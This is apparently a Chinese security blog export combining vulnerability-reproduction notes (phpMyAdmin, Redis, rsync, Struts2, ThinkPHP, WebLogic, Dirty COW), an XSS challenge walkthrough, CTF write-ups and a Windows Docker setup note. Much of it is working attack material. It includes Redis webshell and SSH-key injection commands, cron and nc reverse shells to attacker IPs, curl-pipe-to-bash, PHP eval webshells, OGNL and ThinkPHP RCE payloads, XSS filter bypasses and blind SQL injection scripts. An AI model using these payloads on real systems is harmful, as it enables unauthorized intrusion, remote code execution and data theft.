out.print(&quot;test&quot;); %&gt; ]]&gt; &lt;/string&gt; &lt;/void&gt; &lt;void method=&quot;close&quot;/&gt; &lt;/object&gt;&lt;/java&gt;&lt;/java&gt; &lt;/work:WorkContext&gt; &lt;/soapenv:Header&gt; &lt;soapenv:Body/&gt;&lt;/soapenv:Envelope&gt; phpMyAdmin 远程代码执行(CVE-2016-5774)简介phpMyAdmin是一套开源的、基于Web的MySQL数据库管理工具。在其查找并替换字符串功能中，将用户输入的信息拼接进preg_replace函数第一个参数中。 在PHP5.4.7以前，preg_replace的第一个参数可以利用\\0进行截断，并将正则模式修改为e。 影响范围 phpmyadmin 4.0.x - 4.6.2 环境搭建使用 vulhub 的靶机，PHP 5.3 + Apache + phpMyAdmin 4.4.15.6 漏洞利用使用 exploit-db的POC，CVE-2016-5734.py 12python CVE-2016-5734.py -c 'system(id);' -u root -p root -d test http://your-ip:8080/# -c 为要执行的 php 语句，-u 数据库用户名，-p 密码，-d 数据库 phpMyAdmin 远程文件包含(CVE-2018-12613)简介phpMyAdmin是一套开源的、基于Web的MySQL数据库管理工具。其index.php中存在一处文件包含逻辑，通过二次编码即可绕过检查，造成远程文件包含漏洞。 影响范围 phpMyAdmin 4.8.1 环境搭建使用 vulhub 的环境 漏洞利用访问http://your-ip:8080/index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd，可以看到文件包含成功 执行SELECT '&lt;?=phpinfo()?&gt;'，查看自己的 sessionid (phpMyAdmin 的值)，然后包含 session 文件，常见 session 文件位置 12345/var/lib/php5/sess_PHPSESSID/var/lib/php7/sess_PHPSESSID/var/lib/php/sess_PHPSESSID/tmp/sess_PHPSESSID/tmp/sessions/sess_PHPSESSED 该容器中 session 文件在/tmp/sess_PHPSESSID Redis 未授权访问简介Redis是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、 Key-Value数据库。 Redis因配置不当可以导致未授权访问，被攻击者恶意利用。当前流行的针对Redis未授权访问的一种新型攻击方式，在特定条件下，如果Redis以root身份运行，黑客可以给root账户写入SSH公钥文件，直接通过SSH登录受害服务器，可导致服务器权限被获取和数据删除、泄露或加密勒索事件发生，严重危害业务正常服务。 部分服务器上的Redis 绑定在 0.0.0.0:6379，并且没有开启认证（这是Redis 的默认配置），以及该端口可以通过公网直接访问，如果没有采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，将会导致 Redis 服务直接暴露在公网上，可能造成其他用户可以直接在非授权情况下直接访问Redis服务并进行相关操作。 影响范围 redis 4.x - redis 5.x 环境搭建使用 vulhub 中的靶机 漏洞利用nmap 探测，nmap -sS 104.199.148.119 ‐‐script=redis‐info redis-cli 连接，redis-cli -h 104.199.148.219 写入webshell（前提：开启 web 服务，已知绝对路径，有文件操作权限）： 12345678# 设置 dir 为网站路径config set dir /var/www/html# 设置文件内容，xxx为任意内容set xxx &quot;\\n\\n\\n&lt;?php @eval($_POST['shell']);?&gt;\\n\\n\\n&quot;# 设置文件名config set dbfilename shell.php# 保存，生成文件save 写入 ssh key（前提：开启 ssh 服务）： 123456789101112131415# 本地创建 ssh 密钥ssh-keygen -t rsa# 将公钥内容写入如文本cd /root/.ssh(echo -e &quot;\\n\\n&quot;; cat id_rsa.pub; echo -e &quot;\\n\\n&quot;) &gt; pub.txt# 将内容写入 redis 服务器，设定 key 为 pubcat pub.txt | redis-cli -h 104.199.148.219 -x set pub# 访问靶机redis-cli -h 104.199.148.219``# 设置公钥备份文件名为 authorized_keysconfig set dbfilename authorized_keys# 保存save# 攻击机 ssh 连接靶机ssh -i id_rsa root@104.199.148.219 crontab： 123456789# 监听一个端口nc -lvvp 4444# 写入计划任务redis-cli -h 104.199.148.219set xxx &quot;\\n\\n*/1 * * * * /bin/bash ‐i&gt;&amp;/dev/tcp/192.168.40.131/4321 0&gt;&amp;1\\n\\n&quot;config set dir /var/spool/cronconfig set dbfilename rootsave# 1分钟后反弹 shell 主从复制 RCE，工具 Lua RCE，工具 rsync 未授权访问简介rsync是Linux下一款数据备份工具，支持通过rsync协议、ssh协议进行远程文件传输。其中rsync协议默认监听873端口，如果目标开启了rsync服务，并且没有配置ACL或访问密码，我们将可以读写目标服务器文件。 环境搭建使用 vulhub 中的靶机 漏洞利用123rsync rsync://your-ip:873/rsync rsync://your-ip:873/src # 列出src模块下的文件rsync -av rsync://your-ip:873/src/etc/passwd ./ # 任意文件下载 反弹 shell，内容： 12#!/bin/bash /bin/bash -i &gt;&amp; /dev/tcp/192.168.91.128/4444 0&gt;&amp;1 提供可执行权限 1chmod +x shell 上传至 /etc/cron.hourly 1rsync -av shell rsync://your-ip:873/src/etc/cron.d/shell 监听端口 1nc -lvvp 4444 Struts2 S2-057 远程命令执行漏洞(（)CVE-2018-11776)简介当Struts2的配置满足以下条件时： alwaysSelectFullNamespace值为true action元素未设置namespace属性，或使用了通配符 namespace将由用户从uri传入，并作为OGNL表达式计算，最终造成任意命令执行漏洞。 影响范围 &lt;= Struct 2.3.34 Struts 2.5.16 环境搭建使用 vulhub 靶机 漏洞利用测试OGNL表达式${233*233}： 1http://your-ip:8080/struts2-showcase/$%7B233*233%7D/actionChain1.action 可以看到 Location 头中计算出了表达式的值。 执行表达式（发送前需 URL 编码）： 12${(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#ct=#request['struts.valueStack'].context).(#cr=#ct['com.opensymphony.xwork2.ActionContext.container']).(#ou=#cr.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ou.getExcludedPackageNames().clear()).(#ou.getExcludedClasses().clear()).(#ct.setMemberAccess(#dm)).(#a=@java.lang.Runtime@getRuntime().exec('id')).(@org.apache.commons.io.IOUtils@toString(#a.getInputStream()))} 同样可在返回头 Location 中看到结果 ThinkPHP 5 远程命令执行简介ThinkPHP是一款运用极广的PHP开发框架。其版本5中，由于没有正确处理控制器名，导致在网站没有开启强制路由的情况下（即默认情况下）可以执行任意方法，从而导致远程命令执行漏洞。其5.0.23以前的版本中，获取method的方法中没有正确处理方法名，导致攻击者可以调用Request类任意方法并构造利用链，从而导致远程代码执行漏洞。 影响范围 ThinkPHP 5.0-5.0.24 ThinkPHP 5.1.0-5.1.30 环境搭建使用 vulhub 中的靶机 漏洞利用5.0.20 版本： 1http://your-ip:8080/index.php?s=/Index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=-1 执行 phpinfo 5.0.23 版本： 向http://192.168.67.145:8080/index.php?s=captcha POST数据 1_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=id 成功执行 id 其他 payload: 5.1.x 12345?s=index/\\think\\Request/input&amp;filter[]=system&amp;data=pwd?s=index/\\think\\view\\driver\\Php/display&amp;content=&lt;?php phpinfo();?&gt;?s=index/\\think\\template\\driver\\file/write&amp;cacheFile=shell.php&amp;content=&lt;?php phpinfo();?&gt;?s=index/\\think\\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id?s=index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id 5.0.x 12345?s=index/think\\config/get&amp;name=database.username // 获取配置信息?s=index/\\think\\Lang/load&amp;file=../../test.jpg // 包含任意文件?s=index/\\think\\Config/load&amp;file=../../t.php // 包含任意.php文件?s=index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id?s=index|think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][0]=whoami 1234567891011121314151617http://php.local/thinkphp5.0.5/public/index.php?s=indexpost_method=__construct&amp;method=get&amp;filter[]=call_user_func&amp;get[]=phpinfo_method=__construct&amp;filter[]=system&amp;method=GET&amp;get[]=whoami# ThinkPHP &lt;= 5.0.13POST /?s=index/indexs=whoami&amp;_method=__construct&amp;method=&amp;filter[]=system# ThinkPHP &lt;= 5.0.23、5.1.0 &lt;= 5.1.16 需要开启框架app_debugPOST /_method=__construct&amp;filter[]=system&amp;server[REQUEST_METHOD]=ls -al# ThinkPHP &lt;= 5.0.23 需要存在xxx的method路由，例如captchaPOST /?s=xxx HTTP/1.1_method=__construct&amp;filter[]=system&amp;method=get&amp;get[]=ls+-al_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=ls Weblogic WLS Core Components 反序列化命令执行漏洞(CVE-2018-2628)简介Oracle 2018年4月补丁中，修复了Weblogic Server WLS Core Components中出现的一个反序列化漏洞（CVE-2018-2628），该漏洞通过t3协议触发，可导致未授权的用户在远程服务器执行任意命令。 影响范围CVE-2019-2725脏牛 Dirty COWLinux Kernel 2.6.22 &lt; 3.9 - ‘Dirty COW /proc/self/mem’ Race COndition Privilege Escalation(/etc/passwd Method)，https://www.exploit-db.com/exploits/40847 脏牛漏洞成功率较高的 exp，一般 exp 提权可能导致服务器宕机，https://github.com/FireFart/dirtycow 使用gcc -pthread dirty.c -o dirty -lcrypt命令对 dirty.c 进行编译，生成一个 dirty 可执行文件，执行 ./dirty 密码命令提权，https://github.com/gbonacini/CVE-2016-5195 解压进入文件夹，执行 make 生成一个 dcow 可执行文件，执行./dcow-s命令提权 待复现 Windows RDP 的RCE (CVE-2019-0708) Pulse Secure SSLVPN Apache Solr RCE 脏牛 内核提权漏洞 (CVE-2016-5195) CVE-2020-0796，POC：https://github.com/danigargu/CVE-2020-0796","link":"/2020/05/17/vulnerability-reproduction/"},{"title":"Windows server 配置","text":"Docker安装 Docker管理员 Powershell 执行 12Install-Module -Name DockerMsftProvider -Repository PSGallery -ForceInstall-Package -Name docker -ProviderName DockerMsftProvider 提示信任，输入 A 下载不成功可以到以下地址手动下载 1https://dockermsft.blob.core.windows.net/dockercontainer/docker-19-03-1.zip 下载完成后复制到C:\\Users\\Administrator\\AppData\\Local\\Temp\\2\\DockerMsftProvider\\下，执行 12C:\\Users\\Administrator\\AppData\\Local\\Temp\\2\\DockerMsftProvider\\Docker-19-03-1.zip -Algorithm SHA256 Install-Package -Name docker -ProviderName DockerMsftProvider -Verbose 完成后重启 daemon.json 位置：C:\\ProgramData\\Docker\\config\\daemon.json 重启 docker 服务 12net stop dockernet start docker 安装 docker-compose在安装 docker 的前提下，到 https://github.com/docker/compose/releases下载最新 的 docker-compose，复制到 docker 的安装目录下即可。","link":"/2020/06/15/windows-server/"},{"title":"Windows中WSL的位置","text":"1C:\\Users\\[user]\\AppData\\Local\\Packages\\KaliLinux.54290C8133FEE_ey8k8hqnwqnmg\\LocalState\\rootfs","link":"/2019/11/27/wslposition/"},{"title":"XSS 总结","text":"XSS（Cross Site Script），跨站脚本攻击 XSS总结Docker 快速搭建 XSS PlatformGithub - XSS Platform 中作者给出了使用 Docker 搭建的方式，文章，做一下记录。 安装 MySQL 1docker run --name mysql5.6 -e MYSQL_ROOT_PASSWORD=********* -d -i -p 33006:3306 mysql:5.6 安装 XSS Platform 1docker run --name xssplatform --link mysql5.6:db -d -i -p 8888:80 daxia/websafe:latest 修改 hosts 1vim /etc/hosts 添加一条记录 1127.0.0.1 xss.localhost 启动 php 和 nginx 服务 1docker exec xssplatform zsh -c &quot;php /root/start.php&quot; 访问http://xss.localhost:8888/打开安装页面，因为已经把 mysql 容器链接到了 xssplatform 容器，数据库地址直接填写 db 即可。 XSS闯关小游戏level 2搜索框中闭合 value 属性和 input 标签 1&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt; level 3上一个方法不管用，过滤了尖括号，单引号闭合属性后用事件弹窗，注释掉后面的内容 1' onclick=alert(1)// level 4和上一个差不多，用双引号闭合 1&quot; onclick=alert(1)// level 5过滤了 script 和 on ，可以用 a 标签 1&quot;&gt;&lt;a href=&quot;javascript:alert(1)&quot; level 6还是过滤了 on 和 script href，但是可以用大小写绕过 1&quot; oNclick=alert(1)// level 7过滤差不多，这次会替换为空并且检测大小写，双写绕过 1&quot; oonNclick=alert(1)// level 8友情链接直接提供了一个 a href，但是没法直接使用javascript:alert(1)，应该是过滤了 script，用 html 实体编码绕过 1&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41; level 9会检测 http 协议，过滤 script，把 http 放在注释中，用%09绕过过滤 1javascr%09ipt:alert(1)//http:// level 10存在隐藏的 form 表单，其中 t_sort可以注入 1?keyword=well done!&amp;t_sort=&quot; type=&quot;text&quot; onclick=&quot;alert(1) level 11隐藏的 form 表单，有一个 t_ref，应该是referer。抓包改一下 1&quot; type=&quot;text&quot; onclick=&quot;alert(1) level 12差不多，这次是 user-agent 1&quot; type=&quot;text&quot; onclick=&quot;alert(1) level 13cookie 1&quot; type=&quot;text&quot; onclick=&quot;alert(1) level 14exif XSS，用含有payload的图片触发，没法复现 level 15Angular5 ng-include 指令，ng-include 用于包含外部 HTML 文件，包含的内容作为指定元素的子节点。ng-include 属性的值可以是一个表达式，返回一个文件名。默认情况下，包含的文件需要包含在同一个域名下。 1/level15.php?src='level1.php?name=test&lt;img src=1 onerror=alert(1)&gt;' level 16过滤了空格、script、/，使用%0d，%0a作为分隔符。 1?keyword=&lt;img%0asrc=x%0donError=alert('xss')&gt; level 171?arg01=a&amp;arg02= onmouseover=alert(1) level 181?arg01=a&amp;arg02=b onmouseout=alert(1) level 19Flash XSS，以后学习 1?arg01=version&amp;arg02=&lt;a href=&quot;javascript:alert(1)&quot;&gt;123&lt;/a&gt; level 20同上 1?arg01=id&amp;arg02=\\%22))}catch(e){}if(!self.a)self.a=!alert(1)//%26width%26height","link":"/2020/05/13/xss/"},{"title":"CTF Writeup","text":"尽量写吧 new bugkuwebweb14提示备份了不少东西，用Githack得到flag。 web15提示vim编辑器，想到源码泄露。输入swp，把1改成i，得到flag。 web20正则匹配动态密文，提交时要使用session或者cookie 123456789101112import requestsimport reurl = 'http://123.206.31.85:10020/'s = requests.session()r = s.get(url).text# print(r)ma = re.search(r'([a-z0-9]{33})',r)# print(ma)param = {'key':ma.group(0)}r = s.get(url,params=param).textprint(r) 安恒月赛2020 4Ezunserialize123456789101112131415161718192021222324252627282930313233343536373839 &lt;?phpshow_source(&quot;index.php&quot;);function write($data) { return str_replace(chr(0) . '*' . chr(0), '\\0\\0\\0', $data);}function read($data) { return str_replace('\\0\\0\\0', chr(0) . '*' . chr(0), $data);}class A{ public $username; public $password; function __construct($a, $b){ $this-&gt;username = $a; $this-&gt;password = $b; }}class B{ public $b = 'gqy'; function __destruct(){ $c = 'a'.$this-&gt;b; echo $c; }}class C{ public $c; function __toString(){ //flag.php echo file_get_contents($this-&gt;c); return 'nice'; }}$a = new A($_GET['a'],$_GET['b']);//省略了存储序列化数据的过程,下面是取出来并反序列化的操作$b = unserialize(read(write(serialize($a)))); 处理过程中只要存在 \\0\\0\\0 这6个字符就会替换成 chr(0)*chr(0) 这3个字符，反序列化过程中会根据长度进行反序列化，就有了逃逸的空间。 最后在 class C 中 toString 方法可以读取 flag.php，class B 中有 echo ，echo 一个 class C 的实例就可以输出了。 1234567891011import requestsurl = 'http://183.129.189.60:10001/'a = '\\\\0\\\\0\\\\0'*8b = 'x&quot;;s:8:&quot;password&quot;;O:1:&quot;B&quot;:1:{s:1:&quot;b&quot;;O:1:&quot;C&quot;:1:{s:1:&quot;c&quot;;s:8:&quot;flag.php&quot;;}}}'r = requests.get(url, params={'a': a, 'b': b})print(r.url)print(r.text)#O:1:&quot;A&quot;:2:{s:8:&quot;username&quot;;s:2:&quot;un&quot;;s:8:&quot;password&quot;;O:1:&quot;B&quot;:1:{s:1:&quot;b&quot;;O:1:&quot;C&quot;:1:{s:1:&quot;c&quot;;s:8:&quot;flag.php&quot;;}}}#O:1:&quot;A&quot;:2:{s:8:&quot;username&quot;;s:2:&quot;un&quot;;s:8:&quot;password&quot;;s:56:&quot;x&quot;;s:8:&quot;password&quot;;O:1:&quot;B&quot;:1:{s:1:&quot;b&quot;;O:1:&quot;C&quot;:1:{s:1:&quot;c&quot;;s:8:&quot;flag.php&quot;;}}} 攻防世界webbaby web提示想想首页是哪个，访问index.php，跳转回 1.php，抓个包，repeater里重放，看到返回的header里面有flag php rcethinkphp 5 的漏洞（https://www.vulnspy.com/cn-thinkphp-5.x-rce/） 1http://111.198.29.45:30031/?s=/index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=echo%20%27%3C?php%20@eval($_POST[c]);?%3E%27%20%3E%20info.php 写入一个shell到info.php，蚁剑连接，根目录下有flag web2123456789101112&lt;?php$s = 'a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws';$_o = base64_decode(strrev(str_rot13($s)));for($_0=0;$_0&lt;strlen($_o);$_0++){ $_c=substr($_o,$_0,1); $__=ord($_c)-1; $_c=chr($__); $_=$_.$_c; }echo strrev($_);?&gt; Reversecsaw2013reversing2执行发现flag是乱码，IDA打开，lpMem存着flag，如果执行到if里面程序就会退出，执行不到messagebox，同时if里面还有好像是处理flag的函数。所以想执行了这个函数之后再执行messagebox，这样就能打印出flag。拖进od，执行到程序设定的断点，nop掉最近的跳转（否则会执行之前的messagebox），接下来执行处理flag的函数，之后跳转到exitprocess，把这个跳转转到messagebox，一共有两个，都试一遍，在第二个得到flag。 dmd-50IDA，发现一串字符串 780438d5b6e29db0898bc4f0225935c0，是上面MD5加密得到的，拖去解密，是grape的两次MD5，再把grape加密一次，得到flag re1拖进OD，搜索字符串 game先运行一遍，像是玩一个游戏，把灯全点亮可以拿到flag。拖进OD，搜索字符串，看到 “done！the flag is”这里，找到跳转进来的位置，记下开始（push ebp）的地址（00C5E940），再到提示选项的地方（1，△），到这一段的开始（push ebp），改成jmp 00C5E940。 getitIDA发现它把东西写入了 /tmp/flag.txt，在remove下断点，去flag.txt看，发现是假的= =。重新看，是一个简单的算法，用python写一下，得到flag 12345678s = 'c61b68366edeb7bdce3c6820314b7498't = r'SharifCTF{????????????????????????????????}'for v5 in range(len(s)): if v5%2: v3 = 1 else: v3 = -1 print(chr(ord(s[v5])+v3),end='') 最后要加上格式 SharifCTF{} Hello Ctf运行，提示输入序列号，随便输，wrong。IDA里打开，发现一串字符串，向下看发现是把输入转换一下和之前的字符串比较，一致就会给出success。 Open Sourcearg1 = 0xcafe arg2 = 25 arg3 = h4cky0u，打印得到flag insanityIDA看一下，好像是把flag和随机数运算一下输出出来，shift F12得到flag logmeinIDA，在主函数的for循环处是算法部分，用c语言照着写下来。 123456789101112#include &lt;stdio.h&gt;int main(){ char s[] = &quot;:\\&quot;AL_RT^L*.?+6/46&quot;; long long t = 28537194573619560LL; char * tp = (char *)&amp;t; for(int i=0;s[i];i++) { printf(&quot;%c&quot;,s[i]^tp[i%7]);}} maze找到关键函数 sub400690，O:a2-1,o:a2+1,.:a3-1,0:a3+1，a1是地图，走出来把方向记下来，得到flag no strings attached32位的elf文件，拖到linux虚拟机里执行一下，出错了。放进IDA，看到4各函数，最后一个把输入和解密之后的数据比较一下，一样会输出success。看一下汇编，decrypt函数运行后有 mov [ebp+s2],eax，解密后的flag在eax里。用gdb，b decrypt,r,n,i r,x/6sw $eax，以word（4字节），字符串形式显示6行，看到flag。 python trade找个在线的pyc反编译网站，看到一个编码算法，反着写出来，得到flag 1234567891011import base64correct = 'XlNkVmtUI1MgXWBZXCFeKY+AaXNt'def decode(s): s = base64.b64decode(s) res = '' for c in s: x = c-16 res += chr(x^32) return resprint(decode(correct)) ShuffleIDA看一下，是一个字符数组，转换成char就拿到了flag simple unpackIDA二进制方式打开，搜索flag，或者用upx脱壳后再打开，可以直接看到flag。 BUUCTFweb[ACTF2020 新生赛]BackupFile提示有源文件，index.php.bak，然后就是一个弱类型，key=123。 [ASIS 2019]Unicorn shop查看源代码，说UTF-8很重要。输入4，1337，提示只能输入一个字符。查一下Unicode，Unicode - Compart，随便找一个比1337大的，取UTF8编码，比如0xF0 0x90 0xA1 0x9F。输入4, %F0%90%A1%9F，得到flag [安洵杯 2019]easy_web看到img=…，可能存在文件包含，base64解密两次，ASCII Hex解密一次，得到555.pnf0？换成index.php加密回去，在img标签的src里看见base64之后的源码。 cmd参数可以执行系统命令，过滤了常用的读取文件的命令。可以使用ca/t f/lag，也可以用sort flag. 下面是一个强类型的md5碰撞，使用fastcoll，.\\fastcoll_v1.0.0.5.exe -o 1.txt 2.txt，生成两个md5内容相同的文件。 1234567891011import requestswith open(r'C:\\Users\\&lt;user&gt;\\Desktop\\1.txt','rb') as f1: with open(r'C:\\Users\\&lt;user&gt;\\Desktop\\2.txt','rb') as f2: a = f1.read() b = f2.read() url = 'http://9c2738e0-05e7-4936-839d-286bde014ef5.node3.buuoj.cn/index.php?img=TmprMlpUWTBOalUzT0RKbE56QTJPRGN3&amp;cmd=' cmd = r'sort /flag' data = {'a': a,'b': b} r = requests.post(url+cmd, data=data) print(r.text) 读取文件时要用绝对路径，否则会找不到文件，原因不明。 [BJDCTF 2nd]fake google随便输点什么，看到提示 SSTI。 1{{1+1}} 能看到结果，直接 tplmap，得到flag。 [安洵杯 2019]easy_serialize_php123456789101112131415161718192021222324252627282930 &lt;?php$function = @$_GET['f'];function filter($img){ $filter_arr = array('php','flag','php5','php4','fl1g'); $filter = '/'.implode('|',$filter_arr).'/i'; return preg_replace($filter,'',$img);}if($_SESSION){ unset($_SESSION);}$_SESSION[&quot;user&quot;] = 'guest';$_SESSION['function'] = $function;extract($_POST);if(!$function){ echo '&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;';}if(!$_GET['img_path']){ $_SESSION['img'] = base64_encode('guest_img.png');}else{ $_SESSION['img'] = sha1(base64_encode($_GET['img_path']));}$serialize_info = filter(serialize($_SESSION));if($function == 'highlight_file'){ highlight_file('index.php');}else if($function == 'phpinfo'){ eval('phpinfo();'); //maybe you can find something in here!}else if($function == 'show_image'){ $userinfo = unserialize($serialize_info); echo file_get_contents(base64_decode($userinfo['img']));} 从后往前看，假设文件在./flag.php，目的是执行file_get_contents('./flag.php')，usrinfo来自filter和反序列化的$_SESSION，filter删除特定的字符串。由于是先反序列化后过滤，本来不属于变量的一部分的字符串可能被收进变量中。extract可以用于覆盖变量。 没有成功，原来文件不是flag.php。 1_SESSION[user]=flagflagflagflagflagflag&amp;_SESSION[function]=a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:2:&quot;dd&quot;;s:1:&quot;a&quot;;}&amp;function=show_image filter会删除flag，img被反序列化。得到flag的位置，改一下payload就可以了。 [BJDCTF2020]EasySearch存在 .swp 备份，先爆破 md6 1234567import hashlibdef md5(s): return hashlib.md5(s.encode('utf-8')).hexdigest()for i in range(1, 10000000): if md5(str(i)).startswith('6d0bc1'): print(i) break 得到2020666，在返回包头看见文件，进入。这个文件是一个 shtml 文件，存在模板注入。 返回 index，用户名处输入payload 1&lt;!--#exec cmd=&quot;命令&quot;--&gt; # 此处使用 ls 发现文件 flag ，访问可以得到flag [BJDCTF 2nd]Schrödinger有个爆破密码的功能，扫下目录发现 test.php，应该是要用这个功能爆破 test 的密码。 看一下 cookie，有个 base64加密的值，user=1589337171，不知道是什么，先改一改，改成999999999999999999，刷新发现页面变了 12Already burst -999999998410662300 sec, 122930 p/sForecast success rate NaN% 刚才的 user 应该是时间，但是改完变成负的了，再改成0试试。 12Already burst 1589337868 sec, 142033 p/sForecast success rate 99.57694165675845% 再 check 成功了，弹出密码av11664517@1583985203，查一下这个av号，是北京大学量子力学的视频，flag 在评论里，脚本跑一下。 [BJDCTF 2nd]duangShell下载源代码.index.php.swp，使用 vim -r index.php.swp恢复 12345678910111213141516&lt;?phperror_reporting(0);echo &quot;how can i give you source code? .swp?!&quot;.&quot;&lt;br&gt;&quot;;if (!isset($_POST['girl_friend'])) { die(&quot;where is P3rh4ps's girl friend ???&quot;);} else { $girl = $_POST['girl_friend']; if (preg_match('/\\&gt;|\\\\\\/', $girl)) { die('just girl'); { } else if (preg_match('/ls|phpinfo|cat|\\%|\\^|\\~|base64|xxd|echo|\\$/i', $girl)) {} {echo &quot;&lt;img src='img/p3_need_beautiful_gf.png'&gt; &lt;!-- He is p3 --&gt;&quot;; } else { //duangShell~~~~ exec($girl); }} 过滤了符号，不能使用变量拼接。禁用了 base64 ，也不能编码绕过。需要反弹sehll 申请小号，开一个 linux lab，在 /var/www/html下写反弹shell 1echo 'bash -i &gt;&amp; /dev/tcp/174.1.54.235/4444 0&gt;&amp;1' &gt; a 监听 1nc -lvvp 4444 到 web 页面 POST 1girl_friend=curl http://174.1.54.235/a|bash 遇到了问题，bash 会自动退出，原因不明，改成 nc 反弹 shell，监听 1nc -lvvp 9999 POST 1girl_friend=nc 174.1.54.235 9999 -e /bin/bash 成功得到shell 12find / -name flagcat /etc/demo/P3rh4ps/love/you/flag [BJDCTF2020]Cookie is so stable提示 cookie，在 flag 页面输入 admin，刷新抓包可以看到 cookie 里面有一个 user 字段，同时页面上显示 Hello，admin。输入 1{{1+1}} 得到2，模板注入。burp 里把 user 字段改成下面的值 1{{_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)}}{{_self.env.getFilter(&quot;cat /flag&quot;)}}; [BJDCTF2020]ZJCTF，不过如此代码审计，/?text=php://input&amp;file=php://filter/read/convert.base64-encode/resource=next.php，POST I have a dream，得到 next.php 源码，也可以用data://text/plain,I%20have%20a%20dream next.php 存在带 /e的 preg_replace，/next.php?\\S*=${getFlag()}&amp;cmd=system('cat /flag'); [BJDCTF2020]The mystery of ipHint 里提到知道 IP，抓包改 XFF，显示的 IP 就会变，想到模板注入 1X-Forwarded-For: {{1+1}} 显示了2，确实存在模板注入，模板是 Smarty 1X-Forwarded-For: {{system(&quot;cat /flag&quot;)}} [BJDCTF 2nd]简单注入打个引号就告诉我 Stop hacking，看下 robots.txt，有 hint.txt 1234Only u input the correct password then u can get the flagand p3rh4ps wants a girl friend.select * from users where username='$_POST[&quot;username&quot;]' and password='$_POST[&quot;password&quot;]'; 过滤了select，=，'，union，and，;，&quot; 可以在username 使用\\转义单引号，就可以在 password 处执行查询了，之后就是常规盲注。抄个脚本： 123456789101112131415161718192021222324252627282930313233import requestsurl = &quot;http://bc5d0433-45b5-486d-8fdd-541a8662fd10.node3.buuoj.cn/index.php&quot;data = {&quot;username&quot;:&quot;admin\\\\&quot;,&quot;password&quot;:&quot;&quot;}result = &quot;&quot;i = 0while( True ): i = i + 1 head=32 tail=127 while( head &lt; tail ): mid = (head + tail) &gt;&gt; 1 #payload = &quot;or/**/if(ascii(substr(username,%d,1))&gt;%d,1,0)#&quot;%(i,mid) payload = &quot;or/**/if(ascii(substr(password,%d,1))&gt;%d,1,0)#&quot;%(i,mid) data['password'] = payload r = requests.post(url,data=data) if &quot;stronger&quot; in r.text : head = mid + 1 else: tail = mid last = result if head!=32: result += chr(head) else: break print(result) [BJDCTF2020]Mark loves catgit 源码泄露 1234567891011121314151617181920212223&lt;?phpinclude 'flag.php';$yds = &quot;dog&quot;;$is = &quot;cat&quot;;$handsome = 'yds';foreach($_POST as $x =&gt; $y){ $$x = $y;}foreach($_GET as $x =&gt; $y){ $$x = $$y;}foreach($_GET as $x =&gt; $y){ if($_GET['flag'] === $x &amp;&amp; $x !== 'flag'){ exit($handsome); }}if(!isset($_GET['flag']) &amp;&amp; !isset($_POST['flag'])){ exit($yds);}y'd'sif($_POST['flag'] === 'flag' || $_GET['flag'] === 'flag'){ exit($is);}echo &quot;the flag is: &quot;.$flag; 看着很复杂，不要有思维定势觉得一定要走到最后一行，实际上在exit()中就可以得到结果。几个 exit 条件中，不传入 flag 的这一条最容易实现，会输出 $yds，所以直接 GET 传入yds=flag，会把真正的flag赋值给$yds，再 exit 就得到了flag。 [BUUCTF 2018]Online Tool同时使用escapechellargs和escapeshellcmd会出现问题，用单引号包含的参数会导致参数注入。 1234567' &lt;?php @eval($_POST[&quot;hack&quot;]);?&gt; -oG hack.php '# escapeshellargs先对单引号转义\\' &lt;?php @eval($_POST[&quot;hack&quot;]);?&gt; -oG hack.php \\'# 然后对反斜线分隔的每个部分加单引号''\\'' &lt;?php @eval($_POST[&quot;hack&quot;]);?&gt; -oG hack.php '\\'''# escapeshellcmd对其他特殊字符转义，但不转义单引号''\\\\'' \\&lt;\\?php \\@eval(\\$_POST\\[\\&quot;hack\\&quot;\\]);\\?\\&gt; -oG hack.php '\\\\''' [CISCN2019 总决赛 Day2 Web1]Easyweb有robots.txt，看到*.php.bak，看看index的源码，有个image.php还有user.php，image.php.bak可以下载。 1234567891011121314151617include &quot;config.php&quot;;$id=isset($_GET[&quot;id&quot;])?$_GET[&quot;id&quot;]:&quot;1&quot;;$path=isset($_GET[&quot;path&quot;])?$_GET[&quot;path&quot;]:&quot;&quot;;$id=addslashes($id);$path=addslashes($path);$id=str_replace(array(&quot;\\\\0&quot;,&quot;%00&quot;,&quot;\\\\'&quot;,&quot;'&quot;),&quot;&quot;,$id);$path=str_replace(array(&quot;\\\\0&quot;,&quot;%00&quot;,&quot;\\\\'&quot;,&quot;'&quot;),&quot;&quot;,$path);$result=mysqli_query($con,&quot;select * from images where id='{$id}' or path='{$path}'&quot;);$row=mysqli_fetch_array($result,MYSQLI_ASSOC);$path=&quot;./&quot; . $row[&quot;path&quot;];header(&quot;Content-Type: image/jpeg&quot;);readfile($path); addslashes在单双引号、反斜杠和空字符前加上反斜杠，strreplace把数组中的内容删除。 